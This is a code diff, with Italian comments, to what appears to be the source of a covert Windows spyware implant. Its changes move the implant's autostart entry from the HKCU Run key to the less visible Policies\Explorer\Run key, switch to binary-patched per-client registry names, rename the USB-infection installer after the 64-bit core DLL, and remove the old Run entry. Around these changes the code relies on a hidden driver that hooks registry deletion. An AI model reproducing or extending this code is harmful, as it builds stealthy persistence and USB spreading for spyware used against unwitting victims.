@@ -90,6 +90,7 @@ char H4DRIVER_NAME[MAX_RAND_NAME];
 char H4DRIVER_NAME_ALT[MAX_RAND_NAME];
 char H4_UPDATE_FILE[MAX_RAND_NAME];
 char REGISTRY_KEY_NAME[MAX_RAND_NAME];
+char OLD_REGISTRY_KEY_NAME[MAX_RAND_NAME];
 char EXE_INSTALLER_NAME[MAX_RAND_NAME];
 
 char SHARE_MEMORY_READ_NAME[MAX_RAND_NAME];
@@ -1620,17 +1621,11 @@ BOOL HM_GuessNames()
 
 	// XXX Attenzione che i successivi li devo derivare da H4_MOBZOO_NAME scramblato di 2
 
-	// La chiave nel registry la deriva dalla directory
-	if ( !(ptr_offset = LOG_ScrambleName(H4_HOME_DIR, 1, TRUE)) )
-		return FALSE;
-	ptr_offset[0] = '*'; // Aggiunge l'* per il SAFE MODE
-	_snprintf_s(REGISTRY_KEY_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);
-	SAFE_FREE(ptr_offset);
-
-	// L'exe per l'infezione USB lo deriva dalla directory (non ha bisogno di estensione, inutile incasinare ancora l'altra linea)
-	if ( !(ptr_offset = LOG_ScrambleName(H4_HOME_DIR, 2, TRUE)) )
-		return FALSE;
-	_snprintf_s(EXE_INSTALLER_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);
+	// La chiave nel registry e' binary patchata
+	_snprintf_s(REGISTRY_KEY_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", BIN_PATCHED_REGISTRY_KEY);
+	_snprintf_s(OLD_REGISTRY_KEY_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", BIN_PATCHED_OLD_REGISTRY_KEY);
+	// L'exe per l'infezione USB lo deriva dal nome del core64
+	_snprintf_s(EXE_INSTALLER_NAME, MAX_RAND_NAME, _TRUNCATE, "I%s", H64DLL_NAME);
 
 	// Genera i nomi della shared memory in base alla chiave per-cliente
 	// XXX Verificare sempre che la chiave NON sia quella embeddata nel codice, maquella binary-patched
@@ -1930,12 +1925,20 @@ void HM_InsertRegistryKey(char *dll_name, BOOL force_insert)
 	HKEY hOpen;
 	HideDevice reg_device;
 
-	// XXX-CRISI2 
 #ifndef RUN_ONCE_KEY
+	// Cancella (se c'e' ancora) la vecchia chiave
+	if (FNC(RegOpenKeyA) (HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hOpen) == ERROR_SUCCESS) {
+		DWORD ktype;
+		if (FNC(RegQueryValueExA)(hOpen, OLD_REGISTRY_KEY_NAME, NULL, &ktype, NULL, NULL) == ERROR_SUCCESS) {
+			FNC(RegDeleteValueA) (hOpen, OLD_REGISTRY_KEY_NAME);
+		}
+		FNC(RegCloseKey)(hOpen);
+	}
+
 	// Se vuole forzarla, non interessa vedere se c'e' gia'
 	if (!force_insert) {
 		DWORD ktype;
-		if (FNC(RegOpenKeyA)(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hOpen) == ERROR_SUCCESS) {
+		if (FNC(RegOpenKeyA)(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", &hOpen) == ERROR_SUCCESS) {
 			if (FNC(RegQueryValueExA)(hOpen, REGISTRY_KEY_NAME, NULL, &ktype, NULL, NULL) == ERROR_SUCCESS) {
 				// La chiave c'e' gia'
 				FNC(RegCloseKey)(hOpen);
@@ -1945,7 +1948,6 @@ void HM_InsertRegistryKey(char *dll_name, BOOL force_insert)
 		}
 	}
 #endif
-	// XXX-CRISI2 
 	// Path a rundll32.exe
 	memset(key_value, 0, sizeof(key_value));
 	FNC(GetSystemDirectoryA)(key_value, sizeof(key_value));
@@ -1988,14 +1990,14 @@ void HM_InsertRegistryKey(char *dll_name, BOOL force_insert)
 		FNC(RegCloseKey)(hOpen);
 	}
 #else
-	if (FNC(RegOpenKeyA)(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hOpen) == ERROR_SUCCESS) {
+	if (FNC(RegOpenKeyA)(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", &hOpen) == ERROR_SUCCESS) {
 		if (FNC(RegSetValueExA)(hOpen, REGISTRY_KEY_NAME, NULL, REG_EXPAND_SZ, (unsigned char *)key_value, strlen(key_value)+1) == ERROR_SUCCESS){
 			FNC(RegCloseKey)(hOpen);
 			return;
 		}
 		FNC(RegCloseKey)(hOpen);
 	}
-	if (FNC(RegCreateKeyA) (HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hOpen) == ERROR_SUCCESS) {
+	if (FNC(RegCreateKeyA) (HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", &hOpen) == ERROR_SUCCESS) {
 		FNC(RegSetValueExA)(hOpen, REGISTRY_KEY_NAME, NULL, REG_EXPAND_SZ, (unsigned char *)key_value, strlen(key_value)+1);		
 		FNC(RegCloseKey)(hOpen);
 	}
@@ -2012,7 +2014,7 @@ void HM_RemoveRegistryKey()
 	// Cerca di cancellare la chiave tramite il driver
 	if (reg_device.unhook_regdeleteA(REGISTRY_KEY_NAME))
 		return;
-	// XXX-CRISI2 
+
 #ifdef RUN_ONCE_KEY
 	if (FNC(RegOpenKeyA) (HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", &hOpen) == ERROR_SUCCESS) 
 		FNC(RegDeleteValueA) (hOpen, REGISTRY_KEY_NAME);
@@ -2020,8 +2022,15 @@ void HM_RemoveRegistryKey()
 	if (FNC(RegOpenKeyA) (HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Runonce", &hOpen) == ERROR_SUCCESS) 
 		FNC(RegDeleteValueA) (hOpen, REGISTRY_KEY_NAME);
 #else
-	if (FNC(RegOpenKeyA) (HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hOpen) == ERROR_SUCCESS) 
+	// Cancella anche la vecchia chiave
+	if (FNC(RegOpenKeyA) (HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hOpen) == ERROR_SUCCESS) {
+		FNC(RegDeleteValueA) (hOpen, OLD_REGISTRY_KEY_NAME);
+		FNC(RegCloseKey)(hOpen);
+	}
+	if (FNC(RegOpenKeyA) (HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", &hOpen) == ERROR_SUCCESS) {
 		FNC(RegDeleteValueA) (hOpen, REGISTRY_KEY_NAME);
+		FNC(RegCloseKey)(hOpen);
+	}
 #endif
 }
 
